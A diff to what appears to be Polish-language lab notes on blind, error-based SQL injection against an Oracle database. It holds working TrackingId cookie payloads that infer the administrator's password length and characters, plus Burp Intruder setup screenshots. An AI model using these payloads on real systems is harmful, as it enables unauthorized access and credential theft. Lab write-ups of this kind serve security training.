@@ -36,7 +36,16 @@ Wynik: zwraca błąd, administrator istnieje w tabeli users
 Weryfikacja długości hasła
 payload: `TrackingId=5tHqfwpyNshiWpOW'||(SELECT CASE WHEN LENGTH(password)>0 THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator')||';`
 payload: `TrackingId=5tHqfwpyNshiWpOW'||(SELECT CASE WHEN LENGTH(password)=20 THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator')||';`
+0
 
+Weryfikacja hasła:
+payload: `TrackingId=5tHqfwpyNshiWpOW'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator')||'`
 
+Setting up Intruder:
+![image](https://github.com/user-attachments/assets/d88e96e4-0644-4a0b-a7ce-93635e418fff)
+Grep - Match
+![image](https://github.com/user-attachments/assets/e65677c7-0edd-46e9-9e37-5470342599d7)
 
+Wyniki:
+![image](https://github.com/user-attachments/assets/59e1799f-43a5-424e-b961-5fef8b6ffe97)
 
